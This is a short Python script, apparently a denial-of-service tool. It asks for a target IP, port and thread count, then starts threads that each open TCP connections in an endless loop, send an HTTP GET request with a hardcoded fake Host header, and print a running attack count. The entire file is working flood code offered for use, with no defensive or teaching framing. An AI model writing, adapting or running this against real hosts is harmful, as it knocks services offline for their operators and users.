import socket
import threading
import os

target = input("Insert target’s IP: ")
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'

attack_num = 0

def attack():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        attack_num += 1
        print(attack_num)

for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()

os.system("clear") 
os.system("toilet ToolName") 
